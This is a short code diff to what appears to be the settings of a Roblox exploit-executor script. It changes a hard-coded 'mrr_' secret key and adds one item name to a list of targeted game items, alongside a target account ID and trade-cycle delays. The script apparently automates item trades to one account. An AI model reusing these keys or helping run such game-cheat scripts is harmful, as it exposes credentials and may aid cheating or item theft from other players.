@@ -1,4 +1,4 @@
-getgenv().SECRET_KEY = "mrr_b4fd604c83f548038b3485c76e15bfd3"
+getgenv().SECRET_KEY = "mrr_1469976e38ff4f5f8612b0d137490988"
 getgenv().TARGET_ID = 6219924104
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
@@ -45,6 +45,7 @@ getgenv().TARGET_BRAINROTS = {
     ["La Taco Combinasion"] = true,
     ["La Ginger Sekolah"] = true,
     ["Los Spaghettis"] = true,
+    ["Ventoliero Pavonero"] = true,
     ["Antonio"] = true,
     ["Jolly Jolly Sahur"] = true,
     ["Dug dug dug"] = true,
